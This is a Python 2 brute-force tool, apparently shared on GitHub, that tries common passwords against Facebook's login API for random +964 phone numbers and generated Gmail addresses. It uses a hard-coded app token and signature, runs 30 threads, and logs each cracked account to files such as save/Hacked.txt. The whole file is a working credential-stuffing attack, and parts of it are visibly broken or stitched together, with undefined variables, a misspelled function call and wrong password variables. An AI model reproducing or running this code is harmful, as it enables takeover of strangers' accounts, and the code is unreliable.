import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
     
try:
    import requests
except ImportError:
    os.system('pip2 install tqdm')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 NBX.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def keluar():
    print 'Good bye '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.Goodex(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0050)

logo = """

           o.     O o.oOOOo.  o      O 
           Oo     o  o     o   O    o  
           O O    O  O     O    o  O   
           O  o   o  oOooOO.     oO    
           O   o  O  o     `O    Oo    
           o    O O  O      o   o  o   
           o     Oo  o     .O  O    O  
           O     `o  `OooOO'  O      o 
                            
                            


--------------------------------------------------
  Author   : Dark
  GitHub   : https://github.com/i4m-dark
  Note     : Tool Create ffff 
  Note     : telegram: @
--------------------------------------------------
                """
back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []


def menuu():
    os.system('clear')
    print logo
    print '1-Crack Random Mobile '
    print '2-Crack Random Mobile (\033[1;32mFree Mod Asia-Korek\033[0m)'
    print'3-Gmail Crack For Facebook '
    print '0-Exit this program'
    print 50 * '~'
    pilih_menu()


def pilih_menu():
    unikers = raw_input('Choose: ')
    if unikers == '':
        print 'Wrong input !'
        pilih_menu()
    elif unikers == '1' or unikers == '01':
        crack_nomor()
    elif unikers == '2' or unikers == '02':
        crack_free()
    elif unikers == '3' or unikers == '03':
        gamil_crack()
    elif unikers == '4' or unikers == '04':
        about()
    elif unikers == '0' or unikers == '00':
        keluar()
    else:
        print 'Wrong input !'
        pilih_menu()


def crack_nomor():
    os.system('clear')
    print logo
    print '1-Continue '
    print 50 * '~'
    zk()


def zk():
    unikers = raw_input('Choose:')
    if unikers == '':
        print 'Wrong input !'
        zk()
    elif unikers == '1' or unikers == '01':
        Goodo()
    else:
        print 'Wrong input !'
        zk()


def Goodo():
    global cekpoint
    global oks
    os.system('clear')
    print logo
    print '770, 750, 751, 771, 772, 752, 780'
    print 50 * '~'
    try:
        c = raw_input('Choose Number ')
        exit(' 3 digit !!') if len(c) < 3 else ''
        k = '+964'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        menu()
    xxx = str(len(id))
    jalan('Total Number:  ' + xxx)
    time.sleep(1)
    time.sleep(1)
    print('\033[1;32mBrute Has Been Start\033[0m')
    print('\033[1;32mThe Process Is Running In Background\033[0m')
    print '\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def NBX(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass1 + '\x1b[0m'
                okb = open('save/Hacked.txt', 'a')
                okb.write('Hack ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '[Check-point] ' + k + c + user + '  ' + pass1
                cps = open('save/Hacked.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' \xe2\x88\x86 ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '1122334455'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass2 + '\x1b[0m'
                    okb = open('save/Good.txt', 'a')
                    okb.write('Hack ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '[Check-point] ' + k + c + user + '  ' + pass2
                    cps = open('save/Good.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = '1234512345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass3 + '\x1b[0m'
                        okb = open('save/Good.txt', 'a')
                        okb.write('Hack ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '[Check-point] ' + k + c + user + '  ' + pass3
                        cps = open('save/Good.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = '123456123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass4 + '\x1b[0m'
                            okb = open('save/Good.txt', 'a')
                            okb.write('Hack ' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '[Check-point] ' + k + c + user + '  ' + pass4
                            cps = open('save/Good.txt', 'a')
                            cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '112233445566'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass5 + '\x1b[0m'
                                okb = open('save/Good.txt', 'a')
                                okb.write('Hack ' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '[Check-point] ' + k + c + user + '  ' + pass5
                                cps = open('save/Good.txt', 'a')
                                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '1234554321'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass6 + '\x1b[0m'
                                    okb = open('save/Good.txt', 'a')
                                    okb.write('Hack ' + k + c + user + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '[Check-point] ' + k + c + user + '  ' + pass6
                                    cps = open('save/Good.txt', 'a')
                                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                
        except:
            pass

    p = ThreadPool(30)
    p.map(NBX, id)
    print 50 * '~'
    print 'Crack Done'
    print 'Total successfull/check-point ' + str(len(oks)) + '/' + str(len(cekpoint))
    print 'CP/OK : save/Good.txt'
    print 50 * '~'
    raw_input('BACK')
    os.system('python2 .NBX.py')

def crack_free():
    os.system('clear')
    print logo
    print '1-Continue '
    print 50 * '~'
    pro()


def pro():
    unikers = raw_input('Choose:')
    if unikers == '':
        print 'Wrong input !'
        pro()
    elif unikers == '1' or unikers == '01':
        Good()
    else:
        print 'Wrong input !'
        pro()


def Good():
    global cekpoint
    global oks
    os.system('clear')
    print logo
    print '770, 750, 751, 771, 780'
    print 50 * '~'
    try:
        c = raw_input('Choose Number ')
        exit(' 3 digit !!') if len(c) < 3 else ''
        k = '+964'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        menu()
    xxx = str(len(id))
    jalan('Total Number:  ' + xxx)
    time.sleep(1)
    time.sleep(1)
    print('\033[1;32mBrute Has Been Start\033[0m')
    print('\033[1;32mThe Process Is Running In Background\033[0m')
    print('\033[1;32mFree Mod ..\033[0m')
    print '\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def dark(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass1
                okb = open('save/Hacked.txt', 'a')
                okb.write('Hack ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'free.facebook.com' in w['error_msg']:
                print '[check-point] ' + k + c + user + ' | ' + pass1
                cps = open('save/Hacked.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' \xe2\x88\x86 ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '1122334455'
                data = urllib.urlopen('https://b-api.facebook.com/?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass2
                    okb = open('save/Good.txt', 'a')
                    okb.write('Hack ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'free.facebook.com' in w['error_msg']:
                    print '[check-point] ' + k + c + user + ' | ' + pass2
                    cps = open('save/Good.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = '1234512345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass3
                        okb = open('save/Good.txt', 'a')
                        okb.write('Hack ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'free.facebook.com' in w['error_msg']:
                        print '[check-point] ' + k + c + user + ' | ' + pass3
                        cps = open('save/Good.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = '123456123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass4
                            okb = open('save/Good.txt', 'a')
                            okb.write('Hack ' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'free.facebook.com' in w['error_msg']:
                            print '[check-point] ' + k + c + user + ' | ' + pass4
                            cps = open('save/Good.txt', 'a')
                            cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '112233445566'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass5
                                okb = open('save/Good.txt', 'a')
                                okb.write('Hack ' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'free.facebook.com' in w['error_msg']:
                                print '[check-point] ' + k + c + user + ' | ' + pass5
                                cps = open('save/Good.txt', 'a')
                                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '1234554321'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass6
                                    okb = open('save/Good.txt', 'a')
                                    okb.write('Hack ' + k + c + user + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'free.facebook.com' in w['error_msg']:
                                    print '[check-point] ' + k + c + user + ' | ' + pass6
                                    cps = open('save/Good.txt', 'a')
                                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '1234qwer'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        print '\033[1;32m[successfull]\033[0m ' + k + c + user + ' | ' + pass7
                                        okb = open('save/Good.txt', 'a')
                                        okb.write('Hack ' + k + c + user + ' | ' + pass7 + '\n')
                                        okb.close()
                                        oks.append(user + pass7)
                                    elif 'free.facebook.com' in w['error_msg']:
                                        print '[check-point] ' + k + c + user + '| ' + pass7
                                        cps = open('save/Good.txt', 'a')
                                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass7 + '\n')
                                        cps.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(dark, id)
    print 50 * '~'
    print 'Crack Done'
    print 'Total successfull/check-point ' + str(len(oks)) + '/' + str(len(cekpoint))
    print 'CP/OK : save/Good.txt'
    print 50 * '~'
    raw_input('BACK')
    os.system('python2 .NBX.py')
    
    
def about():
    os.system('clear')
    print logo
    print('Bo Har keshyak Nama Bnern Telegram: @i4m_dark')
    print('==========================================')
    print '1-Join Chanell '
    print '2-telegram: @i4m_dark'
    print '3-Back To menu'
    print('===========================================')
    dark_inf()
    


def dark_inf():
    dark_un = raw_input('Choose: ')
    if dark_un == '':
        print 'Wrong input !'
        p_inf()
    elif dark_un == '1' or dark_un == '01':
        ch()
    elif dark_un == '2' or dark_un == '02':
        telegram()
    elif dark_un == '3' or dark_un == '03':
        back()
    
    else:
        print 'Wrong input !'
        p_inf()

def ch():
	os.system('xdg-open https://t.me/kak_zed_1')
	menuu()
	
	
	
	
def telegram():
		os.system('xdg-open https://t.me/i4m_dark')
		jalan('Ok Send Question')
		jalan('Bo Har Keshayak')
		time.sleep(5)
		os.system('clear')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')    
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		jalan('\033[1;32mWait to Back menu\033[0m')
		time.sleep(5)
		menuu()
	
	
		
		
def gmail_crack():
    import os,sys,time,random,threading,json
os.system("rm -rf ..txt")
for n in range(1,1000):

    sys.stdout = open("..txt", "a")

    print(n)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def exb():
	print "[!] Exit"
	os.sys.exit()

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### LOGO #####
logo= """

           o.     O o.oOOOo.  o      O 
           Oo     o  o     o   O    o  
           O O    O  O     O    o  O   
           O  o   o  oOooOO.     oO    
           O   o  O  o     `O    Oo    
           o    O O  O      o   o  o   
           o     Oo  o     .O  O    O  
           O     `o  `OooOO'  O      o 
                            
                            


--------------------------------------------------
  Author   : Dark
  GitHub   : https://github.com/i4m-dark
  Note     : Tool Create Dark 
  Note     : telegram: @i4m_dark
--------------------------------------------------
                """

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r Loging In "+o),;sys.stdout.flush();time.sleep(1)


back = 0
successful = []
cpb = []
oks = []
id = []


def gmail_crack():
	os.system('clear')
	print logo
	print "[1] Crack Gmail (FB)"
	print "[0] Exit            "
	print 50*"-"
	action()


def action():
	chb = raw_input("\n Dark=")
	if chb =="":
		print "[!] Fill in correctly"
		action()
	elif chb =="1":
		crack_action()
	elif chb =="0":
		exb()
	else:
		print "[!] Fill in correctly"
		action()


def crack_action():
	bch = ""
	if bch =="":
		os.system('clear')
		print logo
		try:
			idlist = ("..txt")
			kn=raw_input(" 1st Name/Password  : ")
			k=raw_input(" Username/Name  : ")
			c=raw_input(" Mail Domain : ")
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '[!] Error 404, please try again'
			raw_input('\n[ Press Enter To Go Back ]')
			menu()
	elif bch =="0":
		menu()
	else:
		print "[!] Fill in correctly"
		crack_action()
	xxx = str(len(id))
	psb (' Please wait, process is running ...')
	time.sleep(0.5)
	psb (' To Stop Process Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*"-"
	print
	
			
	def main(arg):
		global cpb,oks
		user = k+arg+c
		try:
			pass1= kn + "1234"
			data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			q = json.loads(data.text)
			if '407' in q['error_msg']:
				print '\x1b[1;92m[Successfull]\x1b[0m ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if '405' in q["error_msg"]:
					print '[check-point] ' + user + ' | ' + pass1
					cps = open("save/checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = kn+'12345'
					data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
					q = json.loads(data.text)
					if '407' in q['error_msg']:
						print '\x1b[1;92m[Successfull]\x1b[0m ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if '405' in q["error_msg"]:
							print '[check-point] ' + user + ' | ' + pass2
							cps = open("save/checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = kn + '123'
							data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
							q = json.loads(data.text)
							if '407' in q['error_msg']:
								print '\x1b[1;92m[Successfull]\x1b[0m ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if '405' in q["error_msg"]:
									print '[check-point] ' + user + ' | ' + pass3
									cps = open("save/checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = '1122334455'
									data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
									q = json.loads(data.text)
									if '407' in q['error_msg']:
										print '\x1b[1;92m[Successfull]\x1b[0m ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if '405' in q["error_msg"]:
											print '[check-point] ' + user + ' | ' + pass4
											cps = open("save/checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
										     pass5 = '1234512345'
									data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
									q = json.loads(data.text)
									if '407' in q['error_msg']:
										print '\x1b[1;92m[Successfull]\x1b[0m ' + user + ' | ' + pass5
										oks.append(user+pass4)
									else:
										if '405' in q["error_msg"]:
											print '[check-point] ' + user + ' | ' + pass5
											cps = open("save/checkpoint.txt", "a")
											cps.write(user+"|"+pass5+"\n")
											cps.close()
											cpb.append(user+pass5)
										
											
											
								
										 
								    
										     
											 
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*"-"
	print ' Process Has Been Completed ....'
	print " Total OK/CP : "+str(len(oks))+"/"+str(len(cpb))
	print(" CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Press Enter To Go Back]")
	os.sys.exit()
	
		
		






menuu()
